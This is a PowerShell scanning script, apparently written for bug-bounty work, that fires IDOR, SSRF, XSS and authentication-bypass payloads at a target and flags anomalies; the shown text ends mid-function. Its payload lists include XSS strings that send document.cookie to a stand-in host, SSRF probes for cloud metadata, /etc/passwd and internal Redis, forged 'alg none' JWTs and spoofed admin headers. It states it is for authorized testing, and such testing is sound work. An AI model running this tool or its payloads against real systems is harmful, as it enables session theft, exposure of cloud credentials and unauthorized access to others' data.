<#
.SYNOPSIS
    Deep-Hunt — Systematic Multi-Pass Vulnerability Hunter for Bug Bounty

.DESCRIPTION
    Performs systematic multi-pass vulnerability testing across discovered endpoints
    on a target. Executes specialized tests for IDOR, SSRF, XSS, and authentication
    bypass vulnerabilities in a structured pipeline. Each pass uses response analysis
    (status code, size delta, timing delta, content diff) to identify anomalies that
    indicate security weaknesses.

    Testing Phases:
      Phase 1 - Baseline: Collect normal response metrics for each endpoint
      Phase 2 - IDOR: Test horizontal/vertical IDOR with parameter manipulation
      Phase 3 - SSRF: Test URL-based endpoints for server-side request forgery
      Phase 4 - XSS: Test input fields and parameters for cross-site scripting
      Phase 5 - Auth Bypass: Test authentication enforcement and bypass vectors
      Phase 6 - Correlation: Cross-reference findings across phases for chains

    Response Analysis Features:
      - Status code change detection (401→200 indicates auth bypass)
      - Response size delta calculation (significant changes in response body)
      - Response timing analysis (delays indicate potential SSRF/blind injection)
      - Content diff analysis (structural changes in responses)
      - Error message pattern detection for information disclosure

    Output generates detailed finding reports per test with evidence, impact
    assessment, and CVSS 3.1 severity scoring.

.PARAMETER Target
    Base target URL for testing. Example: https://target.com

.PARAMETER Endpoints
    Array of endpoint paths or URLs to test. Can be relative or absolute.
    Example: @('/api/users/1', '/api/profile', '/search?q=test')

.PARAMETER Cookies
    Session cookies for authenticated testing. Hashtable of cookie name-value pairs.
    Example: @{ 'session' = 'abc123'; 'csrf' = 'xyz' }

.PARAMETER Headers
    Additional HTTP headers for requests. Hashtable of header name-value pairs.
    Example: @{ 'X-CSRF-Token' = 'xyz'; 'Authorization' = 'Bearer jwt...' }

.PARAMETER OutputFile
    Path to write the detailed findings report (JSON format).

.PARAMETER Threads
    Number of concurrent threads for parallel testing. Default: 5

.PARAMETER Timeout
    HTTP request timeout in seconds. Default: 30

.PARAMETER Phases
    Comma-separated list of phases to run: baseline,idor,ssrf,xss,auth,correlation
    Default: all phases

.PARAMETER IdorPatterns
    Custom IDOR test parameter values. Default: 1,2,3,9999,admin,other

.PARAMETER SsrfCallbackUrl
    Callback URL or host for SSRF detection. Example: https://burpcollaborator.net

.PARAMETER XssPayloads
    Custom XSS payload file path. Default: uses built-in payload list.

.PARAMETER RateLimit
    Minimum milliseconds between requests. Default: 100

.PARAMETER Silent
    Suppress all non-data output. Only findings and errors are emitted.

.EXAMPLE
    .\deep-hunt.ps1 -Target "https://target.com" -Endpoints @('/api/users/1', '/api/profile') -Cookies @{'session'='abc123'} -OutputFile "findings.json"

    Runs all phases against specified endpoints with authenticated session.

.EXAMPLE
    .\deep-hunt.ps1 -Target "https://target.com" -Phases "idor,ssrf" -SsrfCallbackUrl "https://burpcollaborator.net" -OutputFile "ssrf-findings.json"

    Runs only IDOR and SSRF phases with callback URL for SSRF verification.

.EXAMPLE
    .\deep-hunt.ps1 -Target "https://target.com" -Endpoints @('/search') -Phases "xss" -Threads 10

    Fast XSS-specific scan with 10 concurrent threads.

.NOTES
    Version     : 1.0.0
    Requires    : PowerShell 5.1+, Windows 10/11 or Windows Server 2016+
    Author      : Hercules-Hunt Toolchain
    Warning     : This tool sends potentially malicious payloads. Only use
                  against authorized targets per bug bounty program scope.
    Details     : Uses Invoke-WebRequest for all HTTP interactions.

.LINK
    https://opencode.ai
#>

Set-StrictMode -Version 2.0
$ErrorActionPreference = 'Stop'

# ============================================================================
# GLOBAL CONSTANTS
# ============================================================================

$Script:DefaultUserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'
$Script:DefaultIdorPatterns = @('1', '2', '3', '9999', '0', '-1', 'admin', 'other', 'test', 'undefined', 'null', 'true', 'false')
$Script:DefaultXssPayloads = @(
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    'javascript:alert(1)',
    '\"><script>alert(1)</script>',
    '<svg onload=alert(1)>',
    '"><svg onload=alert(1)>',
    '{{constructor.constructor("alert(1)")()}}',
    '#<script>alert(1)</script>',
    ';alert(1);//',
    '<scr<script>alert(1)</script>ipt>',
    '<ScRiPt>alert(1)</ScRiPt>',
    '%3Cscript%3Ealert(1)%3C/script%3E',
    '<script>fetch("https://callback.test/"+document.cookie)</script>',
    '<img src=x onerror=this.src="https://callback.test/"+document.cookie>',
    '"-prompt(1)-"',
    '<a onmouseover=alert(1)>hover</a>',
    '<body onload=alert(1)>',
    '<input autofocus onfocus=alert(1)>'
)
$Script:DefaultSsrfPayloads = @(
    'http://127.0.0.1:80',
    'http://127.0.0.1:8080',
    'http://127.0.0.1:443',
    'http://localhost:80',
    'http://localhost:8080',
    'http://[::1]:80',
    'http://[::1]:8080',
    'http://0.0.0.0:80',
    'http://0.0.0.0:8080',
    'http://169.254.169.254/latest/meta-data/',
    'http://169.254.169.254/latest/user-data/',
    'http://metadata.google.internal/',
    'http://100.100.100.200/latest/meta-data/',
    'http://10.0.0.1:80',
    'http://172.16.0.1:80',
    'http://192.168.1.1:80',
    'file:///etc/passwd',
    'file:///c:/windows/win.ini',
    'dict://127.0.0.1:11211/',
    'gopher://127.0.0.1:6379/'
)
$Script:DefaultAuthBypassPayloads = @(
    'admin',
    'administrator',
    'root',
    'user',
    'test',
    'null',
    'undefined',
    'true',
    'false',
    '1',
    '0',
    '-1',
    '{id:1}',
    '{"role":"admin"}',
    '{"is_admin":true}',
    '{"admin":true}'
)

# ============================================================================
# FUNCTION: Invoke-WebRequestSafe
# ============================================================================

function Invoke-WebRequestSafe {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$Uri,
        [string]$Method = 'GET',
        [string]$Body,
        [string]$ContentType,
        [hashtable]$Headers,
        [hashtable]$Cookies,
        [int]$TimeoutSec = 30
    )
    $params = @{
        Uri             = $Uri
        Method          = $Method
        TimeoutSec      = $TimeoutSec
        UserAgent       = $Script:DefaultUserAgent
        UseBasicParsing = $true
        ErrorAction     = 'Stop'
    }
    if ($Body) { $params['Body'] = $Body }
    if ($ContentType) { $params['ContentType'] = $ContentType }
    if ($Headers) { $params['Headers'] = $Headers }
    if ($Cookies) {
        $wc = New-Object System.Net.WebClient
        $cookieHeader = ($Cookies.GetEnumerator() | ForEach-Object { "$($_.Key)=$($_.Value)" }) -join '; '
        if ($params.ContainsKey('Headers')) {
            $params['Headers']['Cookie'] = $cookieHeader
        }
        else {
            $params['Headers'] = @{ 'Cookie' = $cookieHeader }
        }
    }

    $sw = [System.Diagnostics.Stopwatch]::StartNew()
    try {
        $response = Invoke-WebRequest @params
        $sw.Stop()
        return [PSCustomObject]@{
            StatusCode   = [int]$response.StatusCode
            Content      = $response.Content
            ContentLength = if ($response.Content) { $response.Content.Length } else { 0 }
            ContentType  = $response.Headers.'Content-Type' -join ', '
            Headers      = $response.Headers
            TimingMs     = $sw.ElapsedMilliseconds
            Success      = $true
            ErrorMessage = $null
        }
    }
    catch {
        $sw.Stop()
        $statusCode = 0
        if ($_.Exception.Response) { $statusCode = [int]$_.Exception.Response.StatusCode }
        return [PSCustomObject]@{
            StatusCode    = $statusCode
            Content       = $null
            ContentLength = 0
            ContentType   = $null
            Headers       = $null
            TimingMs      = $sw.ElapsedMilliseconds
            Success       = $false
            ErrorMessage  = $_.Exception.Message
        }
    }
}

# ============================================================================
# FUNCTION: Build-FullUrl
# ============================================================================

function Build-FullUrl {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$Target,
        [string]$Endpoint
    )
    if ($Endpoint -match '^https?://') { return $Endpoint }
    $base = $Target.TrimEnd('/')
    if ($Endpoint -match '^/') { return "$base$Endpoint" }
    return "$base/$Endpoint"
}

# ============================================================================
# FUNCTION: Get-BaselineResponse
# ============================================================================

function Get-BaselineResponse {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$Url,
        [hashtable]$Cookies,
        [hashtable]$Headers,
        [int]$TimeoutSec = 30
    )
    $baseline = Invoke-WebRequestSafe -Uri $Url -Method GET -Cookies $Cookies -Headers $Headers -TimeoutSec $TimeoutSec
    return $baseline
}

# ============================================================================
# FUNCTION: Calculate-ResponseDelta
# ============================================================================

function Calculate-ResponseDelta {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [PSCustomObject]$Baseline,
        [Parameter(Mandatory)]
        [PSCustomObject]$Test
    )
    $delta = [PSCustomObject]@{
        StatusCodeDelta   = $Test.StatusCode - $Baseline.StatusCode
        SizeDelta         = $Test.ContentLength - $Baseline.ContentLength
        SizeDeltaPercent  = if ($Baseline.ContentLength -gt 0) { [Math]::Round(($Test.ContentLength - $Baseline.ContentLength) / $Baseline.ContentLength * 100, 2) } else { 0 }
        TimingDelta       = $Test.TimingMs - $Baseline.TimingMs
        TimingDeltaPercent = if ($Baseline.TimingMs -gt 0) { [Math]::Round(($Test.TimingMs - $Baseline.TimingMs) / $Baseline.TimingMs * 100, 2) } else { 0 }
        StatusChanged     = ($Test.StatusCode -ne $Baseline.StatusCode)
        SignificantSizeChange = ([Math]::Abs($Test.ContentLength - $Baseline.ContentLength) -gt 100)
        SignificantTimingChange = ([Math]::Abs($Test.TimingMs - $Baseline.TimingMs) -gt 2000)
    }
    return $delta
}

# ============================================================================
# FUNCTION: Test-Idor
# ============================================================================

function Test-Idor {
    [CmdletBinding(SupportsShouldProcess)]
    param(
        [Parameter(Mandatory)]
        [string]$Url,
        [hashtable]$Cookies,
        [hashtable]$Headers,
        [PSCustomObject]$Baseline,
        [string[]]$IdorPatterns,
        [int]$TimeoutSec = 30,
        [int]$RateLimitMs = 100
    )
    $findings = [System.Collections.Generic.List[PSCustomObject]]::new()
    if ($PSCmdlet.ShouldProcess($Url, 'Test IDOR')) {
        $urlParams = @()
        $urlPath = $Url

        $uri = $null
        try { $uri = [System.Uri]$Url } catch { return $findings }
        $queryString = $uri.Query
        if ($queryString) {
            $urlPath = $Url.Split('?')[0]
            $parsedParams = [System.Web.HttpUtility]::ParseQueryString($queryString)
            foreach ($key in $parsedParams.AllKeys) {
                $urlParams += @{ Key = $key; Value = $parsedParams[$key]; Type = 'QueryString' }
            }
        }

        $pathSegments = $uri.Segments | Where-Object { $_ -match '^\d+$' }
        foreach ($segment in $pathSegments) {
            $segment = $segment.Trim('/')
            $urlParams += @{ Key = 'PathSegment'; Value = $segment; Type = 'Path' }
        }

        foreach ($param in $urlParams) {
            foreach ($pattern in $IdorPatterns) {
                Start-Sleep -Milliseconds $RateLimitMs
                $testUrl = $Url

                if ($param.Type -eq 'QueryString') {
                    $testUrl = $urlPath
                    $newParams = @()
                    $parsed = [System.Web.HttpUtility]::ParseQueryString($queryString)
                    foreach ($k in $parsed.AllKeys) {
                        if ($k -eq $param.Key) { $newParams += "$k=$([System.Web.HttpUtility]::UrlEncode($pattern))" }
                        else { $newParams += "$k=$([System.Web.HttpUtility]::UrlEncode($parsed[$k]))" }
                    }
                    $testUrl = "$urlPath?" + ($newParams -join '&')
                }
                elseif ($param.Type -eq 'Path') {
                    $testUrl = $urlPath.Replace($param.Value, $pattern)
                }

                $response = Invoke-WebRequestSafe -Uri $testUrl -Cookies $Cookies -Headers $Headers -TimeoutSec $TimeoutSec
                $delta = Calculate-ResponseDelta -Baseline $Baseline -Test $response

                if ($delta.StatusChanged -and $response.StatusCode -eq 200 -and $Baseline.StatusCode -ne 200) {
                    $findings.Add([PSCustomObject]@{
                        Type        = 'IDOR'
                        SubType     = 'Access Granted via Parameter Change'
                        Url         = $testUrl
                        Parameter   = $param.Key
                        Original    = $param.Value
                        Payload     = $pattern
                        BaselineCode = $Baseline.StatusCode
                        TestCode    = $response.StatusCode
                        Delta       = $delta
                        Evidence    = "Original: $($Baseline.StatusCode) -> Payload $pattern: $($response.StatusCode)"
                    })
                }

                if ($delta.SignificantSizeChange -and $delta.StatusChanged -eq $false -and $response.StatusCode -eq 200) {
                    $findings.Add([PSCustomObject]@{
                        Type        = 'IDOR'
                        SubType     = 'Different Data Returned'
                        Url         = $testUrl
                        Parameter   = $param.Key
                        Original    = $param.Value
                        Payload     = $pattern
                        BaselineCode = $Baseline.StatusCode
                        TestCode    = $response.StatusCode
                        Delta       = $delta
                        Evidence    = "Size changed by $($delta.SizeDeltaPercent)% ($($delta.SizeDelta) bytes)"
                    })
                }
            }
        }

        # Test POST/PUT body IDOR
        $bodyPatterns = @(
            @{ Key = 'id'; Value = '1' },
            @{ Key = 'user_id'; Value = '1' },
            @{ Key = 'userId'; Value = '1' },
            @{ Key = 'account_id'; Value = '1' },
            @{ Key = 'profile_id'; Value = '1' }
        )

        foreach ($bp in $bodyPatterns) {
            foreach ($pattern in $IdorPatterns) {
                Start-Sleep -Milliseconds $RateLimitMs
                $testBody = "{ `"$($bp.Key)`": `"$pattern`" }"
                $response = Invoke-WebRequestSafe -Uri $Url -Method POST -Body $testBody -ContentType 'application/json' -Cookies $Cookies -Headers $Headers -TimeoutSec $TimeoutSec
                if ($response.Success) {
                    if ($response.StatusCode -eq 200 -and (-not ($Baseline.StatusCode -eq 200))) {
                        $findings.Add([PSCustomObject]@{
                            Type        = 'IDOR'
                            SubType     = 'POST Body IDOR'
                            Url         = $Url
                            Parameter   = $bp.Key
                            Original    = $bp.Value
                            Payload     = $pattern
                            BaselineCode = $Baseline.StatusCode
                            TestCode    = $response.StatusCode
                            Evidence    = "POST with $($bp.Key)=$pattern returned $($response.StatusCode)"
                        })
                    }
                }
            }
        }
    }
    return $findings
}

# ============================================================================
# FUNCTION: Test-Ssrf
# ============================================================================

function Test-Ssrf {
    [CmdletBinding(SupportsShouldProcess)]
    param(
        [Parameter(Mandatory)]
        [string]$Url,
        [hashtable]$Cookies,
        [hashtable]$Headers,
        [PSCustomObject]$Baseline,
        [string]$CallbackUrl,
        [int]$TimeoutSec = 30,
        [int]$RateLimitMs = 100
    )
    $findings = [System.Collections.Generic.List[PSCustomObject]]::new()
    if ($PSCmdlet.ShouldProcess($Url, 'Test SSRF')) {
        $ssrfPayloads = $Script:DefaultSsrfPayloads

        # Test query parameters
        $uri = $null
        try { $uri = [System.Uri]$Url } catch { return $findings }
        $queryString = $uri.Query

        if ($queryString) {
            $urlPath = $Url.Split('?')[0]
            $parsedParams = [System.Web.HttpUtility]::ParseQueryString($queryString)

            foreach ($key in $parsedParams.AllKeys) {
                $originalValue = $parsedParams[$key]
                $lowerKey = $key.ToLowerInvariant()

                $ssrfIndicators = @('url', 'uri', 'link', 'src', 'href', 'source', 'target', 'redirect', 'callback', 'webhook', 'endpoint', 'file', 'path', 'page', 'load', 'fetch', 'include', 'import', 'render', 'preview', 'image', 'img', 'avatar', 'cover', 'photo', 'file_url', 'fileurl', 'download', 'read', 'get', 'proxy', 'forward', 'location', 'next', 'return', 'continue', 'dest', 'destination')

                $isSsrfCandidate = $false
                foreach ($indicator in $ssrfIndicators) {
                    if ($lowerKey -eq $indicator -or $lowerKey -like "*$indicator*") { $isSsrfCandidate = $true; break }
                }

                if ($isSsrfCandidate) {
                    foreach ($payload in $ssrfPayloads) {
                        Start-Sleep -Milliseconds $RateLimitMs
                        $encodedPayload = [System.Web.HttpUtility]::UrlEncode($payload)
                        $newParams = @()
                        foreach ($k in $parsedParams.AllKeys) {
                            if ($k -eq $key) { $newParams += "$k=$encodedPayload" }
                            else { $newParams += "$k=$([System.Web.HttpUtility]::UrlEncode($parsedParams[$k]))" }
                        }
                        $testUrl = "$urlPath?" + ($newParams -join '&')

                        $response = Invoke-WebRequestSafe -Uri $testUrl -Cookies $Cookies -Headers $Headers -TimeoutSec ($TimeoutSec + 5)
                        $delta = Calculate-ResponseDelta -Baseline $Baseline -Test $response

                        $interesting = $false
                        if ($payload -match '169\.254|metadata|google' -and $response.StatusCode -eq 200) { $interesting = $true }
                        if ($delta.SignificantTimingChange -and $response.TimingMs -gt ($Baseline.TimingMs * 3)) { $interesting = $true }
                        if ($response.Content -match 'root:.*:0:0:|\[default\]|ami-id|instance-id|roleName') { $interesting = $true }
                        if ($response.ErrorMessage -match 'connection refused|timed out') { $interesting = $true }

                        if ($interesting) {
                            $findings.Add([PSCustomObject]@{
                                Type        = 'SSRF'
                                SubType     = if ($response.StatusCode -eq 200) { 'Potential Metadata Access' } elseif ($delta.SignificantTimingChange) { 'Timing Anomaly' } else { 'Connection Indication' }
                                Url         = $testUrl
                                Parameter   = $key
                                Payload     = $payload
                                BaselineCode = $Baseline.StatusCode
                                TestCode    = $response.StatusCode
                                BaselineTiming = $Baseline.TimingMs
                                TestTiming  = $response.TimingMs
                                Evidence    = "Payload: $payload -> Status: $($response.StatusCode), Timing: $($response.TimingMs)ms (baseline: $($Baseline.TimingMs)ms)"
                            })
                        }
                    }

                    # Test with callback URL
                    if ($CallbackUrl) {
                        Start-Sleep -Milliseconds $RateLimitMs
                        $encodedCb = [System.Web.HttpUtility]::UrlEncode($CallbackUrl)
                        $cbParams = @()
                        foreach ($k in $parsedParams.AllKeys) {
                            if ($k -eq $key) { $cbParams += "$k=$encodedCb" }
                            else { $cbParams += "$k=$([System.Web.HttpUtility]::UrlEncode($parsedParams[$k]))" }
                        }
                        $cbUrl = "$urlPath?" + ($cbParams -join '&')
                        $cbResponse = Invoke-WebRequestSafe -Uri $cbUrl -Cookies $Cookies -Headers $Headers -TimeoutSec $TimeoutSec

                        $findings.Add([PSCustomObject]@{
                            Type        = 'SSRF'
                            SubType     = 'Callback Test'
                            Url         = $cbUrl
                            Parameter   = $key
                            Payload     = $CallbackUrl
                            BaselineCode = $Baseline.StatusCode
                            TestCode    = $cbResponse.StatusCode
                            Evidence    = "Callback URL sent. Check $CallbackUrl for incoming connections."
                        })
                    }
                }
            }
        }

        # Test POST body SSRF
        if ($Url -notmatch '\.(css|js|png|jpg|gif|ico|svg|woff|woff2|ttf|eot)$') {
            foreach ($payload in $ssrfPayloads) {
                Start-Sleep -Milliseconds $RateLimitMs
                $testBody = @{
                    url     = $payload
                    uri     = $payload
                    link    = $payload
                    src     = $payload
                    href    = $payload
                    file    = $payload
                    redirect = $payload
                } | ConvertTo-Json

                $response = Invoke-WebRequestSafe -Uri $Url -Method POST -Body $testBody -ContentType 'application/json' -Cookies $Cookies -Headers $Headers -TimeoutSec ($TimeoutSec + 5)
                if ($response.Success -and $response.TimingMs -gt ($Baseline.TimingMs * 3)) {
                    $findings.Add([PSCustomObject]@{
                        Type        = 'SSRF'
                        SubType     = 'POST Body SSRF - Timing Anomaly'
                        Url         = $Url
                        Parameter   = 'JSON Body'
                        Payload     = $payload
                        BaselineCode = $Baseline.StatusCode
                        TestCode    = $response.StatusCode
                        Evidence    = "POST with SSRF payload caused timing change: $($response.TimingMs)ms vs $($Baseline.TimingMs)ms baseline"
                    })
                }
            }
        }
    }
    return $findings
}

# ============================================================================
# FUNCTION: Test-Xss
# ============================================================================

function Test-Xss {
    [CmdletBinding(SupportsShouldProcess)]
    param(
        [Parameter(Mandatory)]
        [string]$Url,
        [hashtable]$Cookies,
        [hashtable]$Headers,
        [PSCustomObject]$Baseline,
        [string[]]$XssPayloads,
        [int]$TimeoutSec = 30,
        [int]$RateLimitMs = 100
    )
    $findings = [System.Collections.Generic.List[PSCustomObject]]::new()
    if ($PSCmdlet.ShouldProcess($Url, 'Test XSS')) {
        $uri = $null
        try { $uri = [System.Uri]$Url } catch { return $findings }
        $queryString = $uri.Query

        if ($queryString) {
            $urlPath = $Url.Split('?')[0]
            $parsedParams = [System.Web.HttpUtility]::ParseQueryString($queryString)

            foreach ($key in $parsedParams.AllKeys) {
                $originalValue = $parsedParams[$key]

                foreach ($payload in $XssPayloads) {
                    Start-Sleep -Milliseconds $RateLimitMs
                    $encodedPayload = [System.Web.HttpUtility]::UrlEncode($payload)
                    $newParams = @()
                    foreach ($k in $parsedParams.AllKeys) {
                        if ($k -eq $key) { $newParams += "$k=$encodedPayload" }
                        else { $newParams += "$k=$([System.Web.HttpUtility]::UrlEncode($parsedParams[$k]))" }
                    }
                    $testUrl = "$urlPath?" + ($newParams -join '&')

                    $response = Invoke-WebRequestSafe -Uri $testUrl -Cookies $Cookies -Headers $Headers -TimeoutSec $TimeoutSec

                    if ($response.Success -and $response.Content) {
                        $payloadDecoded = [System.Web.HttpUtility]::UrlDecode($encodedPayload)
                        $reflectedPattern = $payloadDecoded -replace '[\+\?\*\.\[\]\(\)\{\}\^\$\|\\]', '\$&'

                        $reflectedInBody = $response.Content -match [regex]::Escape($payloadDecoded.Substring(0, [Math]::Min(20, $payloadDecoded.Length)))
                        $reflectedUnaltered = $response.Content.Contains($payloadDecoded)

                        if ($reflectedUnaltered) {
                            $findings.Add([PSCustomObject]@{
                                Type        = 'XSS'
                                SubType     = 'Reflected (Unencoded)'
                                Url         = $testUrl
                                Parameter   = $key
                                Payload     = $payload
                                BaselineCode = $Baseline.StatusCode
                                TestCode    = $response.StatusCode
                                Evidence    = "Payload '$payload' reflected unencoded in response body"
                                Severity    = 'High'
                            })
                        }
                        elseif ($reflectedInBody) {
                            $findings.Add([PSCustomObject]@{
                                Type        = 'XSS'
                                SubType     = 'Reflected (Partially Encoded)'
                                Url         = $testUrl
                                Parameter   = $key
                                Payload     = $payload
                                BaselineCode = $Baseline.StatusCode
                                TestCode    = $response.StatusCode
                                Evidence    = "Payload partially reflected in response body"
                                Severity    = 'Medium'
                            })
                        }

                        # Check for XSS in error messages
                        if ($response.Content -match '(?:alert|prompt|confirm)\s*\(\s*1\s*\)') {
                            $findings.Add([PSCustomObject]@{
                                Type        = 'XSS'
                                SubType     = 'Executed / Error Context'
                                Url         = $testUrl
                                Parameter   = $key
                                Payload     = $payload
                                BaselineCode = $Baseline.StatusCode
                                TestCode    = $response.StatusCode
                                Evidence    = "alert(1) or similar appeared in response - XSS may have executed"
                                Severity    = 'Critical'
                            })
                        }
                    }
                }
            }
        }

        # Test POST body XSS
        $xssBodyParams = @('name', 'message', 'comment', 'text', 'content', 'body', 'description', 'title', 'subject', 'search', 'q', 'query', 'input', 'feedback', 'review')
        foreach ($param in $xssBodyParams) {
            $param = $param.ToLowerInvariant()
            $uriLower = $Url.ToLowerInvariant()
            $relevant = @('form', 'submit', 'post', 'comment', 'feedback', 'contact', 'message', 'search', 'input', 'api')
            $isXssTarget = $false
            foreach ($r in $relevant) { if ($uriLower -match $r) { $isXssTarget = $true; break } }
            if (-not $isXssTarget) { continue }

            foreach ($payload in $XssPayloads) {
                Start-Sleep -Milliseconds $RateLimitMs
                $testBody = @{ $param = $payload } | ConvertTo-Json
                $response = Invoke-WebRequestSafe -Uri $Url -Method POST -Body $testBody -ContentType 'application/json' -Cookies $Cookies -Headers $Headers -TimeoutSec $TimeoutSec

                if ($response.Success -and $response.Content) {
                    if ($response.Content.Contains($payload) -or $response.Content -match '(?:alert|prompt|confirm)\s*\(\s*1\s*\)') {
                        $findings.Add([PSCustomObject]@{
                            Type        = 'XSS'
                            SubType     = 'Stored / POST Body'
                            Url         = $Url
                            Parameter   = $param
                            Payload     = $payload
                            BaselineCode = $Baseline.StatusCode
                            TestCode    = $response.StatusCode
                            Evidence    = "Payload '$payload' reflected in POST response for parameter $param"
                            Severity    = if ($response.Content.Contains($payload)) { 'High' } else { 'Critical' }
                        })
                    }
                }
            }
        }
    }
    return $findings
}

# ============================================================================
# FUNCTION: Test-AuthBypass
# ============================================================================

function Test-AuthBypass {
    [CmdletBinding(SupportsShouldProcess)]
    param(
        [Parameter(Mandatory)]
        [string]$Url,
        [hashtable]$Cookies,
        [hashtable]$Headers,
        [PSCustomObject]$Baseline,
        [int]$TimeoutSec = 30,
        [int]$RateLimitMs = 100
    )
    $findings = [System.Collections.Generic.List[PSCustomObject]]::new()
    if ($PSCmdlet.ShouldProcess($Url, 'Test Auth Bypass')) {
        # Test 1: Direct access without cookies
        if ($Cookies -and $Cookies.Count -gt 0) {
            $noAuthResponse = Invoke-WebRequestSafe -Uri $Url -TimeoutSec $TimeoutSec
            if ($noAuthResponse.Success -and $noAuthResponse.StatusCode -eq 200) {
                $sizeDelta = [Math]::Abs(($noAuthResponse.ContentLength - $Baseline.ContentLength))
                if ($sizeDelta -lt 500) {
                    $findings.Add([PSCustomObject]@{
                        Type        = 'AuthBypass'
                        SubType     = 'No Auth Required'
                        Url         = $Url
                        Evidence    = "Endpoint accessible without authentication (status: $($noAuthResponse.StatusCode))"
                        Severity    = 'Critical'
                    })
                }
            }
        }

        # Test 2: Header-based bypass
        $headerBypassTests = @(
            @{ 'X-Forwarded-For' = '127.0.0.1' },
            @{ 'X-Forwarded-Host' = 'localhost' },
            @{ 'X-Real-IP' = '127.0.0.1' },
            @{ 'X-Original-URL' = '/admin' },
            @{ 'X-Rewrite-URL' = '/admin' },
            @{ 'X-Forwarded-Proto' = 'https' },
            @{ 'X-ProxyUser-IP' = '127.0.0.1' },
            @{ 'Client-IP' = '127.0.0.1' },
            @{ 'X-Auth-Token' = 'admin' },
            @{ 'X-Admin' = 'true' },
            @{ 'X-Role' = 'admin' },
            @{ 'X-Roles' = 'admin,user' },
            @{ 'X-Permissions' = '*:*' },
            @{ 'X-User-Type' = 'admin' },
            @{ 'X-Internal' = 'true' },
            @{ 'X-Auth-Override' = 'true' },
            @{ 'Authorization' = 'Basic YWRtaW46YWRtaW4=' },
            @{ 'Authorization' = 'Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.' },
            @{ 'Authorization' = 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwicm9sZSI6ImFkbWluIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c' }
        )

        foreach ($bypassHeader in $headerBypassTests) {
            Start-Sleep -Milliseconds $RateLimitMs
            $combinedHeaders = @{}
            if ($Headers) { foreach ($h in $Headers.Keys) { $combinedHeaders[$h] = $Headers[$h] } }
            foreach ($h in $bypassHeader.Keys) { $combinedHeaders[$h] = $bypassHeader[$h] }

            $response = Invoke-WebRequestSafe -Uri $Url -Headers $combinedHeaders -Cookies $Cookies -TimeoutSec $TimeoutSec

            if ($response.Success -and $response.StatusCode -eq 200 -and $Baseline.StatusCode -ne 200) {
                $findings.Add([PSCustomObject]@{
                    Type        = 'AuthBypass'
                    SubType     = 'Header Manipulation'
                    Url         = $Url
                    HeaderName  = ($bypassHeader.Keys | Select-Object -First 1)
                    HeaderValue = ($bypassHeader.Values | Select-Object -First 1)
                    BaselineCode = $Baseline.StatusCode
                    TestCode    = $response.StatusCode
                    Evidence    = "Added header $($bypassHeader.Keys | Select-Object -First 1): $($bypassHeader.Values | Select-Object -First 1) -> Status $($response.StatusCode)"
                    Severity    = 'Critical'
                })
            }
        }

        # Test 3: Method override
        $methodOverrideTests = @('GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD', 'TRACE')
        foreach ($method in $methodOverrideTests) {
            if ($method -eq 'GET') { continue }
            Start-Sleep -Milliseconds $RateLimitMs
            $overrideHeaders = @{ 'X-HTTP-Method-Override' = $method }
            $response = Invoke-WebRequestSafe -Uri $Url -Method GET -Headers $overrideHeaders -Cookies $Cookies -TimeoutSec $TimeoutSec

            if ($response.Success -and $response.StatusCode -eq 200 -and $response.ContentLength -gt 0) {
                $delta = Calculate-ResponseDelta -Baseline $Baseline -Test $response
                if (-not $delta.StatusChanged -or $response.StatusCode -eq 200) {
                    $findings.Add([PSCustomObject]@{
                        Type        = 'AuthBypass'
                        SubType     = 'Method Override'
                        Url         = $Url
                        OverrideMethod = $method
                        BaselineCode = $Baseline.StatusCode
                        TestCode    = $response.StatusCode
                        Evidence    = "X-HTTP-Method-Override: $method returned status $($response.StatusCode)"
                        Severity    = 'Medium'
                    })
                }
            }
        }

        # Test 4: Path traversal bypass
        $authBypassPaths = @('/../', '/%2e/', '/%2e%2e/', '/./', '//', '/%00', '/*', '/..;/', '/;/', '/admin', '/../admin', '//admin//')
        foreach ($pathBypass in $authBypassPaths) {
            Start-Sleep -Milliseconds $RateLimitMs
            $bypassUrl = $Url.TrimEnd('/') + $pathBypass
            $response = Invoke-WebRequestSafe -Uri $bypassUrl -Cookies $Cookies -Headers $Headers -TimeoutSec $TimeoutSec
            if ($response.Success -and $response.StatusCode -eq 200) {
                $findings.Add([PSCustomObject]@{
                    Type        = 'AuthBypass'
                    SubType     = 'Path Manipulation'
                    Url         = $bypassUrl
                    PathSuffix  = $pathBypass
                    BaselineCode = $Baseline.StatusCode
                    TestCode    = $response.StatusCode
                    Evidence    = "Path suffix '$pathBypass' bypassed auth (status: $($response.StatusCode))"
                    Severity    = 'High'
                })
            }
        }

        # Test 5: JSON content type bypass
        $jsonBypassBody = @{} | ConvertTo-Json
        $jsonResponse = Invoke-WebRequestSafe -Uri $Url -Method POST -Body $jsonBypassBody -ContentType 'application/json' -Cookies $Cookies -Headers $Headers -TimeoutSec $TimeoutSec
        if ($jsonResponse.Success -and $jsonResponse.StatusCode -eq 200 -and $Baseline.StatusCode -ne 200) {
            $findings.Add([PSCustomObject]@{
                Type        = 'AuthBypass'
                SubType     = 'Content-Type Bypass'
                Url         = $Url
                BaselineCode = $Baseline.StatusCode
                TestCode    = $jsonResponse.StatusCode
                Evidence    = "JSON content-type bypassed auth (status: $($jsonResponse.StatusCode))"
                Severity    = 'High'
            })
        }
    }
    return $findings
}

# ============================================================================
# FUNCTION: Invoke-CorrelationAnalysis
# ============================================================================

function Invoke-CorrelationAnalysis {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [PSCustomObject[]]$AllFindings
    )
    $chains = [System.Collections.Generic.List[PSCustomObject]]::new()

    $idorFindings = $AllFindings | Where-Object { $_.Type -eq 'IDOR' }
